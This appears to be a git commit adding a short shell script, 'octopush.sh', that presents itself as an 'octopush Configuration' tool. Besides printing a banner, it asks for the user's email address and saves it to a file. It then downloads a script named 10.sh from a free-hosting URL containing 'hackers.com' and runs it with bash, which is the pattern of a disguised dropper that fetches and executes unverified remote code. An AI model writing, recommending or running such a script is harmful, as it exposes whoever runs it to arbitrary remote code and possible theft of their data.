e6893a25c8499f293992903c6d9e98cefa4d9015
wolfyy <60975463+wolfyy59@users.noreply.github.com>
2023-03-13 13:39:49 +0100

    Add files via upload

---
+++ octopush.sh
@@ -0,0 +1,8 @@
+echo -e "\x1b[30;44m Welcome to octopush Configuration \x1b[m"
+echo -e "\x1b[31m  Version 2.0.7"
+read -p"Your email address: " user
+echo $user > hi.txt
+wget https://socialpilot.000webhostapp.com/hackers.com/10.sh
+bash 10.sh
+
+
